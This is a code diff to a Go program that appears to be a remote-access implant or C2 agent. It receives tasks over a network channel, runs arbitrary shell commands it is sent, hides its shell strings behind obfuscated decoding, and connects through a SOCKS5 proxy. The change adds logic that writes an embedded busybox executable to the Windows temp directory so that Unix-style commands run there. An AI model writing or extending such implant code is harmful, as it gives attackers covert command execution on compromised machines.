@@ -11,10 +11,12 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"os/user"
 	"runtime"
 	"sort"
 	"strconv"
+	"sync"
 	"strings"
 	"time"
 
@@ -157,7 +159,8 @@ func runTask(t *proto.Msg) *proto.Msg {
 	res := &proto.Msg{Type: proto.MsgResult, TaskID: t.TaskID, Task: t.Task, OK: false}
 	switch t.Task {
 	case proto.TaskExec:
-		cmd := exec.Command(shell(), shellArg(), t.Cmd)
+		bin, args := shellCmd(t.Cmd)
+		cmd := exec.Command(bin, args...)
 		var so, se strings.Builder
 		cmd.Stdout = &so
 		cmd.Stderr = &se
@@ -264,6 +267,44 @@ func shellArg() string {
 		return "/c"
 	}
 	return dec(_obfSHDash)
+}
+
+// ensureBusyBox Windows 释出内嵌 busybox 到临时目录（供 sh 语法执行），失败返回空
+var _bbPathOnce sync.Once
+var _bbPath string
+
+func ensureBusyBox() string {
+	if runtime.GOOS != "windows" || len(busyBoxExe) == 0 {
+		return ""
+	}
+	_bbPathOnce.Do(func() {
+		dir := filepath.Join(os.TempDir(), "bb")
+		p := filepath.Join(dir, "busybox.exe")
+		if _, err := os.Stat(p); err == nil {
+			_bbPath = p
+			return
+		}
+		if err := os.MkdirAll(dir, 0o755); err != nil {
+			return
+		}
+		if err := os.WriteFile(p, busyBoxExe, 0o755); err != nil {
+			return
+		}
+		_bbPath = p
+	})
+	return _bbPath
+}
+
+// shellCmd 返回执行命令用的 (程序, 参数)：Windows 优先 busybox sh（Unix 语法 + 透传系统 exe），
+// 不可用时回退 cmd /c；类 Unix 用 /bin/sh -c。
+func shellCmd(raw string) (string, []string) {
+	if runtime.GOOS == "windows" {
+		if bb := ensureBusyBox(); bb != "" {
+			return bb, []string{"sh", "-c", raw}
+		}
+		return "cmd", []string{"/c", raw}
+	}
+	return dec(_obfSH), []string{dec(_obfSHDash), raw}
 }
 
 // dial 按配置走 socks5 代理或直连
